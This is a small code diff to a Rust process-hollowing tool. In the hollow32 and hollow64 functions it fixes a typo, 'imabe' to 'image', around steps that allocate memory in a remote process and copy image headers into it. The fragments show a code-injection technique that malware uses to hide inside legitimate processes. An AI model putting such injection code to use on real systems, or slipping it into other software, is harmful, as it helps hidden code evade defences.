@@ -56,13 +56,13 @@ pub unsafe fn hollow32(src: impl Into<String>, dest: impl Into<String>) -> Resul
     if new_address as u64 == 0x0 as u64 {
         bail!("could not allocate of the remote process image. VirtualAllocEx calling was failed.")
     };
-    container.change_target_imabe_base(new_address);
+    container.change_target_image_base(new_address);
 
     // calculate delta before to change base address
     let delta = shared::Delta::calculate_delta(container.target_image_base as usize, container.payload_base() as usize);
 
     // change base address to allocated memory address
-    container.change_payload_imabe_base(new_address);
+    container.change_payload_image_base(new_address);
 
     container.copy_remote_headers(hp)?;
     container.copy_remote_section_headers(hp)?;
@@ -125,13 +125,13 @@ pub unsafe fn hollow64(src: impl Into<String>, dest: impl Into<String>) -> Resul
     if new_address as u64 == 0x0 as u64 {
         bail!("could not allocate of the remote process image. VirtualAllocEx calling was failed.")
     };
-    container.change_target_imabe_base(new_address);
+    container.change_target_image_base(new_address);
 
     // calculate delta before to change base address
     let delta = shared::Delta::calculate_delta(container.target_image_base as usize, container.payload_base() as usize);
 
     // change base address to allocated memory address
-    container.change_payload_imabe_base(new_address);
+    container.change_payload_image_base(new_address);
 
     container.copy_remote_headers(hp)?;
     container.copy_remote_section_headers(hp)?;
